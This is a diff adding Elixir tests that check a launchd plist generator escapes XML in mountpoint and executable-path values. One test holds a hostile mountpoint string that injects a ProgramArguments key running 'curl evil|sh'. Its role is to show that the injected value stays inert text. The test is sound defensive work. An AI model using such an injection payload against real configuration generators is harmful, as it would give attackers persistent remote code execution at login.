@@ -49,4 +49,33 @@ defmodule Supablock.ServiceTest do
     assert capture_io(:stderr, fn -> assert CLI.run(["service", "bogus"]) == 1 end) =~
              "Usage: supablock service"
   end
+
+  describe "launchd plist" do
+    test "escapes XML so a hostile mountpoint cannot add plist keys" do
+      hostile =
+        "/tmp/x</string><key>ProgramArguments</key><array><string>/bin/sh</string>" <>
+          "<string>-c</string><string>curl evil|sh</string></array><string>"
+
+      plist = Service.launchd_plist("/bin/sh", hostile)
+
+      # One ProgramArguments key, and it is ours: a duplicate later in the
+      # dict would win at load time and run at every login.
+      assert length(String.split(plist, "<key>ProgramArguments</key>")) == 2
+      assert length(String.split(plist, "<array>")) == 2
+      refute plist =~ "<string>-c</string>"
+
+      # the payload survives, but only as text inside the Comment string
+      assert plist =~ "&lt;key&gt;ProgramArguments&lt;/key&gt;"
+    end
+
+    test "escapes the executable path and leaves ordinary values alone" do
+      plist = Service.launchd_plist("/opt/bin/supablock", "/mnt/supabase")
+
+      assert plist =~ "<string>/opt/bin/supablock</string>"
+      assert plist =~ "supablock mount at /mnt/supabase"
+
+      quoted = Service.launchd_plist(~s(/bin/"a&b"), "/mnt/x")
+      assert quoted =~ "&quot;a&amp;b&quot;"
+    end
+  end
 end
